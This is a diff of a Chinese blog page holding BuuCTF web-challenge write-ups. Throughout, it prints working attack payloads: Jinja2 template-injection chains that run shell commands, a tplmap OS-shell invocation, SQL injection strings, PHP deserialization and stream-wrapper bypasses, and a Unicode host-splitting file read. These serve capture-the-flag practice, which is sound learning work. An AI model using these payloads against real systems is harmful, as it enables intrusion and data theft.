@@ -59,7 +59,7 @@
   </style>
   <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
   </style>
-<meta name="generator" content="Hexo 5.1.1"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
   <div class="scrollbar" id="bar">
@@ -332,7 +332,7 @@ def read_file(file):
 
     # catch GET
     start = 0
-    params = &#123;&#125;
+    params = {}
     while str.find(&quot;$_GET[&#39;&quot;, start) != -1:
         pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_GET[&#39;&quot;, start) + 1)
         var = str[str.find(&quot;$_GET[&#39;&quot;, start) + 7: pos2]
@@ -342,7 +342,7 @@ def read_file(file):
 
     # catch POST
     start = 0
-    data = &#123;&#125;
+    data = {}
     while str.find(&quot;$_POST[&#39;&quot;, start) != -1:
         pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_POST[&#39;&quot;, start) + 1)
         var = str[str.find(&quot;$_POST[&#39;&quot;, start) + 8: pos2]
@@ -395,39 +395,39 @@ $kDxfM-&gt;gHht = $aYunX[0];
 <p><strong>代码审计</strong></p>
 <pre><code class="php">Flag need your 100000000 money
 ~~~post money and password~~~
-if (isset($_POST[&#39;password&#39;])) &#123;
+if (isset($_POST[&#39;password&#39;])) {
     $password = $_POST[&#39;password&#39;];
-    if (is_numeric($password)) &#123;
+    if (is_numeric($password)) {
         echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;
-    &#125;elseif ($password == 404) &#123;
+    }elseif ($password == 404) {
         echo &quot;Password Right!&lt;/br&gt;&quot;;
-    &#125;
-&#125;</code></pre>
+    }
+}</code></pre>
 <p>0x00 password设置%00截断绕过is_numeric</p>
 <p>0x01 money=100000000</p>
 <p>构造payload</p>
 <h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p><strong>解题方法</strong></p>
 <p>文件扫描</p>
 <pre><code>python3 dirsearch.py -u http://f1658aa4-f3d6-4a32-8f19-7364b8a64e13.node3.buuoj.cn/ -e php</code></pre>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/image-20200727201101600.png" alt="image-20200727201101600"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200727201101600.png" alt="image-20200727201101600"></p>
 <p><strong>代码审计</strong></p>
 <pre><code class="php">&lt;?php
 include &quot;flag.php&quot;;
 
-if(isset($_GET[&#39;key&#39;])) &#123;
+if(isset($_GET[&#39;key&#39;])) {
     $key = $_GET[&#39;key&#39;];
-    if(!is_numeric($key)) &#123;
+    if(!is_numeric($key)) {
         exit(&quot;Just num!&quot;);
-    &#125;
+    }
     $key = intval($key);
     $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
-    if($key == $str) &#123;
+    if($key == $str) {
         echo $flag;
-    &#125;
-&#125;
-else &#123;
+    }
+}
+else {
     echo &quot;Try to find out source file!&quot;;
-&#125;</code></pre>
+}</code></pre>
 <p><strong>解题思路</strong></p>
 <p>0x00 is_numeric() -&gt; key为纯数字字符串</p>
 <p>0x01 intval($key) == $str -&gt; 数字key与str弱相等</p>
@@ -451,20 +451,20 @@ if ($str2 == 4)
 $text = $_GET[&quot;text&quot;];
 $file = $_GET[&quot;file&quot;];
 $password = $_GET[&quot;password&quot;];
-if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123; //a
+if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;)){ //a
     echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
-    if(preg_match(&quot;/flag/&quot;,$file))&#123;
+    if(preg_match(&quot;/flag/&quot;,$file)){
         echo &quot;Not now!&quot;;
         exit(); 
-    &#125;else&#123;
+    }else{
         include($file);  //useless.php //b
         $password = unserialize($password);
         echo $password;
-    &#125;
-&#125;
-else&#123;
+    }
+}
+else{
     highlight_file(__FILE__);
-&#125;
+}
 ?&gt; </code></pre>
 <p><strong>解题思路</strong></p>
 <p>0x00 利用<code>php://date</code>或<code>php://input</code>绕过<code>file_get_contents</code></p>
@@ -472,25 +472,25 @@ else&#123;
 <p>0x02 利用反序列化漏洞</p>
 <p><strong>解题方法</strong></p>
 <p>构造payload<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>或者利用burpsuite结合<code>php://input</code>的方法绕过a处</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/image-20200728155621286.png" alt="image-20200728155621286"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200728155621286.png" alt="image-20200728155621286"></p>
 <p><strong>如果使用php://input必须使用burpsuite</strong>，因为hackbar不对无参数名的值进行处理</p>
 <p>构造payload<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code>之后base64解码获得unless.php源码</p>
 <pre><code class="php">&lt;?php
-class Flag&#123;  //flag.php
+class Flag{  //flag.php
     public $file;
-    public function __tostring()&#123;
-        if(isset($this-&gt;file))&#123;
+    public function __tostring(){
+        if(isset($this-&gt;file)){
             echo file_get_contents($this-&gt;file);
             echo &quot;&lt;br&gt;&quot;;
             return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
-        &#125;
-    &#125;
-&#125;
+        }
+    }
+}
 ?&gt;</code></pre>
 <p>构造脚本获取序列化值</p>
-<pre><code class="php">class Flag&#123; 
+<pre><code class="php">class Flag{ 
     public $file = &#39;flag.php&#39;;
-&#125;
+}
 echo urlencode(serialize(new Flag()));
 O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></pre>
 <p>此时要修改file值为unless.php，使得b处可以正确的包含文件，综合三个payload即可</p>
@@ -507,7 +507,7 @@ O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</c
 <p><code>F12</code>查看响应头</p>
 <pre><code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code></pre>
 <p><strong>解题方法</strong></p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/image-20200728110619421.png" alt="image-20200728110619421"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200728110619421.png" alt="image-20200728110619421"></p>
 <p>实验吧原题，令<code>$pass = ffifdyop</code>其原始二进制为<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code></p>
 <p>此时sql语句如下</p>
 <pre><code class="php">$sql = &quot;SELECT * FROM admin WHERE password = &#39;&#39;or&#39;6�]��!r,��b&#39;&quot;;</code></pre>
@@ -518,7 +518,7 @@ O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</c
 $a = $GET[&#39;a&#39;];
 $b = $_GET[&#39;b&#39;];
 
-if($a != $b &amp;&amp; md5($a) == md5($b))&#123;
+if($a != $b &amp;&amp; md5($a) == md5($b)){
     // wow, glzjin wants a girl friend.
 --&gt;</code></pre>
 <p>构造<code>/levels91.php?a[]=1&amp;b[]=2</code>即可，原理是因为MD5函数不能处理数组，默认返回null</p>
@@ -529,9 +529,9 @@ include &quot;flag.php&quot;;
 
 highlight_file(__FILE__);
 
-if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))&#123;
+if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){
     echo $flag;
-&#125; </code></pre>
+} </code></pre>
 <p><code>param1[]=1&amp;param2[]=2</code>不详述</p>
 <h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><p><strong>题目提示</strong></p>
 <p>访问<code>/qaq?name=</code>查看源码后得知输入点存在ssti模板注入</p>
@@ -540,13 +540,13 @@ if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;
 <p>0x00 利用变量包裹标识符进行ssti</p>
 <p>0x01 沙箱逃逸 &amp; rce</p>
 <p><strong>解题方法</strong></p>
-<pre><code>/qaq?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat ../flag').read()")&#125;&#125;</code></pre>
+<pre><code>/qaq?name={{().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat ../flag').read()")}}</code></pre>
 <p><strong>另类解题方法</strong></p>
 <pre><code class="powershell">&gt; python tplmap.py -u &#39;http://url/qaq?name=&#39; --os-shell
     ...
   GET parameter: name
   Engine: Jinja2
-  Injection: &#123;&#123;*&#125;&#125;
+  Injection: {{*}}
   Context: text
   OS: posix-linux
   Technique: render
@@ -590,7 +590,7 @@ __subclasses__() //继承此对象的子类，返回一个列表</code></pre>
 <h3 id="逃逸链"><a href="#逃逸链" class="headerlink" title="逃逸链"></a>逃逸链</h3><p><code>变量 -&gt; 对象 -&gt; 基类 -&gt; 子类遍历 -&gt; 全局变量 -&gt; 命令执行</code></p>
 <pre><code class="python">()(变量).__class__(对象).__bases__[0](基类).__subclasses__()[169](warnings.catch_warnings子类含有eval).__init__(初始化).__globals__(遍历全局变量).__builtins__[&#39;eval&#39;](eval内置命令执行函数)(&quot;__import__(&#39;os&#39;).popen(&#39;cat ../flag&#39;).read()&quot;)(os.popen().read()打开文件并回显内容)</code></pre>
 <h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>点击 help，跳转到<code>/Download?filename=help.docx</code>，存在任意文件读取漏洞</p>
-<pre><code>java.io.FileNotFoundException:&#123;help.docx&#125; // 界面回显</code></pre>
+<pre><code>java.io.FileNotFoundException:{help.docx} // 界面回显</code></pre>
 <p>此时读取文件失败，修改请求方法为 post</p>
 <p><code>filename=/WEB-INF/web.xml</code></p>
 <pre><code class="xml">...
@@ -619,14 +619,14 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 
 @WebServlet(name = &quot;FlagController&quot;)
-public class FlagController extends HttpServlet &#123;
+public class FlagController extends HttpServlet {
   String flag = &quot;ZmxhZ3s1ZTNhNzBjMS0xNzk2LTRmNmQtODUyOC05ZmE1MzYzOGNhZTV9Cg==&quot;;
 
-  protected void doGet(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse) throws ServletException, IOException &#123;
+  protected void doGet(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse) throws ServletException, IOException {
     PrintWriter printWriter = paramHttpServletResponse.getWriter();
     printWriter.print(&quot;&lt;h1&gt;Flag is nearby ~ Come on! ! !&lt;/h1&gt;&quot;);
-  &#125;
-&#125;</code></pre>
+  }
+}</code></pre>
 <h2 id="什么是WEB-INF-amp-WEB-INF重要目录和文件"><a href="#什么是WEB-INF-amp-WEB-INF重要目录和文件" class="headerlink" title="什么是WEB-INF &amp; WEB-INF重要目录和文件"></a>什么是WEB-INF &amp; WEB-INF重要目录和文件</h2><p><strong>WEB-INF 是 JavaWeb 的安全目录</strong>，所谓安全就是客户端无法访问，只有服务端可以访问的目录</p>
 <ul>
 <li><p><strong>/WEB-INF/web.xml</strong></p>
@@ -647,7 +647,7 @@ public class FlagController extends HttpServlet &#123;
 </ul>
 <h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p><strong>解题方法</strong></p>
 <p>简单测试后可以判断存在过滤，fuzz后决定采用updatexml报错注入</p>
-<img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/image-20200728164134048.png" alt="image-20200728164134048" style="zoom:50%;">
+<img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200728164134048.png" alt="image-20200728164134048" style="zoom:50%;">
 
 <p>查看数据表名</p>
 <pre><code>/check.php?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=1</code></pre>
@@ -658,12 +658,12 @@ public class FlagController extends HttpServlet &#123;
 <h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p><strong>代码审计</strong></p>
 <pre><code class="php">&lt;?php
 --- a
-if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;
+if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
     $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
-&#125;
-if(!isset($_GET[&#39;host&#39;])) &#123;
+}
+if(!isset($_GET[&#39;host&#39;])) {
     highlight_file(__FILE__);
-&#125; else &#123;
+} else {
 --- b
     $host = $_GET[&#39;host&#39;];
     $host = escapeshellarg($host);
@@ -675,7 +675,7 @@ if(!isset($_GET[&#39;host&#39;])) &#123;
     chdir($sandbox);
 --- d
     echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
-&#125;
+}
 --- e</code></pre>
 <p><strong>解题思路</strong></p>
 <p>0x00 <code>a-b &amp; c-d</code>区域代码意义不大，仅仅是为用户建立一个专属文件夹</p>
@@ -734,14 +734,14 @@ wrong pass!</code></pre>
 <pre><code class="php">select * from user where username = &#39;$name&#39;</code></pre>
 <p>简单猜测后台逻辑</p>
 <pre><code class="php">$result = select * from user where username = &#39;$name&#39;;
-if ($result[1] === &#39;admin&#39;) &#123;
+if ($result[1] === &#39;admin&#39;) {
   if ($result[2] === md5($pw))
       yes
   else 
         wrong pass
-&#125; else &#123;
+} else {
   wrong user
-&#125;</code></pre>
+}</code></pre>
 <p>利用<code>union select</code>特性</p>
 <pre><code class="mysql"># 临时建立测试表
 mysql&gt; select * from user where username = &#39;admin&#39; union select 1,2,3;
@@ -768,81 +768,81 @@ include(&quot;flag.php&quot;);
 
 highlight_file(__FILE__);
 
-class FileHandler &#123;
+class FileHandler {
 
     protected $op;
     protected $filename;
     protected $content;
 
-    function __construct() &#123;
+    function __construct() {
         $op = &quot;1&quot;;
         $filename = &quot;/tmp/tmpfile&quot;;
         $content = &quot;Hello World!&quot;;
         $this-&gt;process();
-    &#125;
+    }
 
-    public function process() &#123;
-        if($this-&gt;op == &quot;1&quot;) &#123;
+    public function process() {
+        if($this-&gt;op == &quot;1&quot;) {
             $this-&gt;write();
-        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
+        } else if($this-&gt;op == &quot;2&quot;) {
             $res = $this-&gt;read();
             $this-&gt;output($res);
-        &#125; else &#123;
+        } else {
             $this-&gt;output(&quot;Bad Hacker!&quot;);
-        &#125;
-    &#125;
+        }
+    }
 
-    private function write() &#123;
-        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
-            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
+    private function write() {
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+            if(strlen((string)$this-&gt;content) &gt; 100) {
                 $this-&gt;output(&quot;Too long!&quot;);
                 die();
-            &#125;
+            }
             $res = file_put_contents($this-&gt;filename, $this-&gt;content);
             if($res) $this-&gt;output(&quot;Successful!&quot;);
             else $this-&gt;output(&quot;Failed!&quot;);
-        &#125; else &#123;
+        } else {
             $this-&gt;output(&quot;Failed!&quot;);
-        &#125;
-    &#125;
+        }
+    }
 
-    private function read() &#123;
+    private function read() {
         $res = &quot;&quot;;
-        if(isset($this-&gt;filename)) &#123;
+        if(isset($this-&gt;filename)) {
             $res = file_get_contents($this-&gt;filename);
-        &#125;
+        }
         return $res;
-    &#125;
+    }
 
-    private function output($s) &#123;
+    private function output($s) {
         echo &quot;[Result]: &lt;br&gt;&quot;;
         echo $s;
-    &#125;
+    }
 
-    function __destruct() &#123;
+    function __destruct() {
         if($this-&gt;op === &quot;2&quot;)
             $this-&gt;op = &quot;1&quot;;
         $this-&gt;content = &quot;&quot;;
         $this-&gt;process();
-    &#125;
+    }
 
-&#125;
+}
 
-function is_valid($s) &#123;
+function is_valid($s) {
     for($i = 0; $i &lt; strlen($s); $i++)
         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
             return false;
     return true;
-&#125;
+}
 
-if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
+if(isset($_GET{&#39;str&#39;})) {
 
     $str = (string)$_GET[&#39;str&#39;];
-    if(is_valid($str)) &#123;
+    if(is_valid($str)) {
         $obj = unserialize($str);
-    &#125;
+    }
 
-&#125;</code></pre>
+}</code></pre>
 <p>0x00 先找反序列化输入点，发现存在<code>is_valid</code>校验</p>
 <p>0x01 <code>is_valid</code>限制输入必须为可见字符，但protect类型存在<code>\00</code>空字符；<strong>利用PHP7.1以上版本对属性类型不敏感特性</strong>使用<code>public</code>绕过</p>
 <p>0x02 反序列过程中一开始进入<code>__destruct</code>，如果<code>op</code>值与<code>&quot;2&quot;</code>强相等就会改成<code>&quot;1&quot;</code>从而执行写方法，用整型<code>2</code>绕过</p>
@@ -850,37 +850,37 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
 <p>0x04 <code>__construct</code>中变量为局部变量，不会影响属性值</p>
 <p><strong>解题方法</strong></p>
 <pre><code class="php">&lt;?php
-class FileHandler &#123;
+class FileHandler {
     public $op = 2;
     public $filename = &quot;flag.php&quot;;
-&#125;
+}
 echo serialize(new FileHandler());
 ?&gt;
-O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre>
-<p>构造payload<code>?str=O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
+O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;}</code></pre>
+<p>构造payload<code>?str=O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;}</code></p>
 <h2 id="php序列化-amp-反序列化时代码走向"><a href="#php序列化-amp-反序列化时代码走向" class="headerlink" title="php序列化 &amp; 反序列化时代码走向"></a>php序列化 &amp; 反序列化时代码走向</h2><p>一个普通的实例会从<code>__construct</code>开始，最后到<code>__destruct</code>销毁；查阅php manual可以了解到: 不论何时，只要有实例需要被<code>serialize</code>序列化，将不会调用 <code>__destruct()</code>或有其他影响，除非程序化地调用此方法；当数据被<code>unserialize</code>反序列化时，类将被感知并且调用合适的方法而不是调用<code>__construct</code>，本题中反序列化后调用的函数为<code>__destruct</code></p>
 <h2 id="反序列化中的protect，private以及public三种属性"><a href="#反序列化中的protect，private以及public三种属性" class="headerlink" title="反序列化中的protect，private以及public三种属性"></a>反序列化中的protect，private以及public三种属性</h2><pre><code class="php">&lt;?php
-class FileHandler &#123;
+class FileHandler {
     private $op = 2;
     protected $filename = &quot;flag.php&quot;;
     public $content = &quot;abc&quot;;
-&#125;
+}
 echo serialize(new FileHandler());
 ?&gt;
-O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;\00FileHandler\00op&quot;;i:2;s:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;abc&quot;;&#125;</code></pre>
+O:11:&quot;FileHandler&quot;:3:{s:15:&quot;\00FileHandler\00op&quot;;i:2;s:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;abc&quot;;}</code></pre>
 <ul>
 <li><code>private</code>变量会在变量名前加<code>\00类名\00</code></li>
 <li><code>protect</code>变量会在变量名前加<code>\00*\00</code></li>
 <li><code>public</code>变量不加前缀</li>
 </ul>
-<h2 id="php反序列化数据完整性所触发的bug"><a href="#php反序列化数据完整性所触发的bug" class="headerlink" title="php反序列化数据完整性所触发的bug"></a>php反序列化数据完整性所触发的bug</h2><p>这题在本地测试时发现一个好玩的地方，输入<code>?str=O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code>并不会回显flag</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/image-20200731110303747.png" alt="image-20200731110303747"></p>
+<h2 id="php反序列化数据完整性所触发的bug"><a href="#php反序列化数据完整性所触发的bug" class="headerlink" title="php反序列化数据完整性所触发的bug"></a>php反序列化数据完整性所触发的bug</h2><p>这题在本地测试时发现一个好玩的地方，输入<code>?str=O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;}</code>并不会回显flag</p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200731110303747.png" alt="image-20200731110303747"></p>
 <p>但删除部分payload后回显flag</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/image-20200731110448934.png" alt="image-20200731110448934"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200731110448934.png" alt="image-20200731110448934"></p>
 <p>原因是因为<strong>正确的和存在错误的反序列化数据会导致读文件的时候工作目录不一样，此处错误数据读的是相对路径，完整数据读绝对路径</strong></p>
 <p>修改<code>filename</code>为绝对路径，之后构造payload进行测试</p>
 <pre><code class="php">public  $filename = &quot;/Library/WebServer/Documents/BuuCTF/AreUSerialz/flag.php&quot;;</code></pre>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/image-20200731110748339.png" alt="image-20200731110748339"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200731110748339.png" alt="image-20200731110748339"></p>
 <h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><p><strong>题目提示</strong></p>
 <pre><code>Powered By THINKPHP5</code></pre>
 <p><strong>解题方法</strong></p>
@@ -896,11 +896,11 @@ O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;\00FileHandler\00op&quot;;i:2;s:
 <pre><code class="mysql">?inject=&#39;; handler FlagHere open; handler FlagHere read first; handler FlagHere close;%23</code></pre>
 <h2 id="HANDLER-statement"><a href="#HANDLER-statement" class="headerlink" title="HANDLER statement"></a>HANDLER statement</h2><pre><code class="mysql">HANDLER tbl_name OPEN [ [AS] alias]
 
-HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)
+HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)
     [ WHERE where_condition ] [LIMIT ... ]
-HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
     [ WHERE where_condition ] [LIMIT ... ]
-HANDLER tbl_name READ &#123; FIRST | NEXT &#125;
+HANDLER tbl_name READ { FIRST | NEXT }
     [ WHERE where_condition ] [LIMIT ... ]
 
 HANDLER tbl_name CLOSE</code></pre>
@@ -919,21 +919,21 @@ HANDLER tbl_name CLOSE</code></pre>
 &lt;?php 
 highlight_file(__FILE__);
 class ClassName
-&#123;
+{
         public $code = null;
         public $decode = null;
         function __construct()
-        &#123;
+        {
                 $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;];
                 $this-&gt;decode = @base64_decode( $this-&gt;code );
                 @Eval($this-&gt;decode);
-        &#125;
+        }
 
         public function x()
-        &#123;
+        {
                 return $_REQUEST;
-        &#125;
-&#125;
+        }
+}
 new ClassName(); </code></pre>
 <p>0x00 获取参数<code>Ginkgo</code></p>
 <p>0x01 <code>base64_decode</code>解码<code>Ginkgo</code></p>
@@ -994,7 +994,7 @@ def getUrl():
     &lt;!-- Do you know the nginx? --&gt;
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
-<p>如果对之前<strong>Black Hat USA 2019</strong>中的<a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">HostSplit</a>有了解，并且知道提示是表达什么鬼提示，这题非常简单</p>
+<p>如果对之前<strong>Black Hat USA 2019</strong>中的<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">HostSplit</a>有了解，并且知道提示是表达什么鬼提示，这题非常简单</p>
 <p><strong>题目提示</strong></p>
 <p><code>Do you know the nginx?</code>，读取<code>nginx</code>配置文件，得知flag文件目录</p>
 <p><code>nginx</code>手动安装位置一般为<code>/usr/local/nginx/</code>，配置文件自然在<code>/usr/local/nginx/conf/nginx.conf</code></p>
@@ -1007,11 +1007,11 @@ def getUrl():
 <ul>
 <li>Unicode进行字符标准化</li>
 </ul>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/16.png"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/16.png"></p>
 <ul>
 <li>punycode转写为ASCII</li>
 </ul>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/17.png"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/17.png"></p>
 <p><strong>Q.What happens if we perform ToASCII against this?</strong></p>
 <p><code>https://evil.c℆.Example.com</code></p>
 <p>**A.It normalizes to **<code>https://evil.cc/u.Example.com</code></p>
@@ -1025,33 +1025,33 @@ def getUrl():
 <p><strong>payload</strong></p>
 <p> <code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code></p>
 <p><strong>return</strong> </p>
-<pre><code class="nginx">server &#123;
+<pre><code class="nginx">server {
     listen 80;
-    location / &#123;
+    location / {
         try_files $uri @app;
-    &#125;
-    location @app &#123;
+    }
+    location @app {
         include uwsgi_params;
         uwsgi_pass unix:///tmp/uwsgi.sock;
-    &#125;
-    location /static &#123;
+    }
+    location /static {
         alias /app/static;
-    &#125;
-    # location /flag &#123;
+    }
+    # location /flag {
     #     alias /usr/fffffflag;
-    # &#125;
-&#125;</code></pre>
+    # }
+}</code></pre>
 <p><strong>payload</strong></p>
 <p> <code>file://suctf.c℆sr/fffffflag</code></p>
 <p><strong>return</strong></p>
-<p><code>SUCTF&#123;67cc389fc00bd1e9db2956f3e46f74ad&#125;</code></p>
+<p><code>SUCTF{67cc389fc00bd1e9db2956f3e46f74ad}</code></p>
 <p>符号<code>℆</code>是直接从<strong>Black Hat USA 2019</strong>的ppt上复制的，也可以用脚本直接爆破<code>c</code></p>
 <p>提一个知识点</p>
 <p><strong>chr()</strong></p>
 <p>某教程的描述</p>
 <p><code>chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符</code></p>
 <p><strong>python文档的描述</strong></p>
